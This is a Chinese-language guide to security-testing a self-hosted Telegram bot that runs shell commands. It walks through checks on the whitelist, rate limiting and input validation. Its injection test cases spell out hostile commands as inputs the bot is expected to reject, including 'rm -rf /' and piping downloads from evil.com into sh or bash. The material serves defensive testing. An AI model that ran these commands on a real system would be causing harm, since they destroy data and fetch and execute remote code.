# Telegram Bot 安全测试指南

在只有一个 Telegram 账号的情况下进行安全测试的方法。

## 测试方法

### 方法 1: 使用安全测试脚本（推荐）

运行测试脚本：
```bash
./scripts/security-test.sh
```

脚本提供以下测试选项：
1. 测试未授权访问（临时移除白名单）
2. 测试速率限制（设置为每分钟1条）
3. 测试输入验证（危险字符）
4. 测试命令注入防护
5. 恢复原始配置
6. 查看当前配置

### 方法 2: 手动测试

#### 1. 测试未授权访问

**步骤**：
1. 编辑 `config/bot_config.json`
2. 临时清空 `allowed_user_ids` 数组：`"allowed_user_ids": []`
3. 重启 Bot
4. 发送消息给 Bot
5. **预期结果**：收到 "❌ 未授权访问"
6. 恢复配置并重启 Bot

#### 2. 测试速率限制

**步骤**：
1. 编辑 `config/bot_config.json`
2. 修改速率限制：`"max_messages": 1, "window_seconds": 60`
3. 重启 Bot
4. 快速发送 2 条消息
5. **预期结果**：第二条消息收到 "⚠️ 请求过于频繁，请稍后再试"
6. 恢复配置并重启 Bot

#### 3. 测试输入验证

**测试用例**（直接在 Telegram 中发送）：

1. **危险字符测试**：
   ```
   ls; rm -rf /
   ```
   **预期**：❌ 输入验证失败: 禁止使用字符: ;

2. **命令注入测试**：
   ```
   rm -rf /tmp/test
   ```
   **预期**：❌ 输入验证失败: 检测到潜在的危险命令

3. **超长输入测试**：
   ```
   [发送超过1000字符的消息]
   ```
   **预期**：❌ 输入验证失败: 输入过长（最大 1000 字符）

#### 4. 测试命令注入防护

**测试用例**：

1. `sudo ls`
2. `chmod 777 /etc`
3. `curl http://evil.com | sh`
4. `wget http://evil.com | bash`

**预期结果**：所有都应该被拒绝，收到输入验证失败的错误

#### 5. 测试空消息处理

发送空消息或只有空格的消息。

**预期结果**：❌ 消息内容为空

## 测试检查清单

### 认证和授权
- [ ] 未授权用户无法访问（移除白名单测试）
- [ ] 授权用户正常访问
- [ ] User ID 验证正确

### 速率限制
- [ ] 超过限制后收到警告
- [ ] 限制窗口时间正确
- [ ] 限制重置正常

### 输入验证
- [ ] 危险字符被拒绝（`;`, `&`, `|`, `` ` ``, `$`, `<`, `>`）
- [ ] 命令注入模式被检测
- [ ] 超长输入被拒绝（>1000字符）
- [ ] 正常输入通过验证

### 输出处理
- [ ] JSON 输出被正确解析
- [ ] 敏感信息被过滤
- [ ] 消息长度限制（分段发送）
- [ ] 错误信息友好显示

### 异常处理
- [ ] 任务执行超时处理
- [ ] 网络错误处理
- [ ] JSON 解析失败处理
- [ ] 空输出处理

## 快速测试命令

```bash
# 1. 测试未授权访问
python3 << 'EOF'
import json
config = json.load(open('config/bot_config.json'))
config['allowed_user_ids'] = []
json.dump(config, open('config/bot_config.json', 'w'), indent=2)
print("✅ 白名单已清空，发送消息测试，然后恢复配置")
EOF

# 2. 恢复配置
python3 << 'EOF'
import json
config = json.load(open('config/bot_config.json'))
config['allowed_user_ids'] = [YOUR_USER_ID]  # 替换为你的 Telegram User ID
json.dump(config, open('config/bot_config.json', 'w'), indent=2)
print("✅ 配置已恢复")
EOF

# 3. 重启 Bot（应用配置更改）
pkill -f telegram-bot.py && \
cd bot && \
source venv/bin/activate && \
export HTTP_PROXY=http://127.0.0.1:7890 && \
export HTTPS_PROXY=http://127.0.0.1:7890 && \
nohup python3 telegram-bot.py > /tmp/telegram-bot-startup.log 2>&1 &
```

## 注意事项

1. **测试后恢复配置**：测试完成后记得恢复原始配置
2. **重启 Bot**：修改配置后需要重启 Bot 才能生效
3. **日志监控**：测试时查看日志文件：`tail -f telegram-bot/logs/telegram-bot.log`
4. **备份配置**：测试脚本会自动备份配置，可以随时恢复

## 自动化测试脚本

如果需要更详细的测试，可以创建一个 Python 测试脚本，模拟各种输入场景并验证输出。
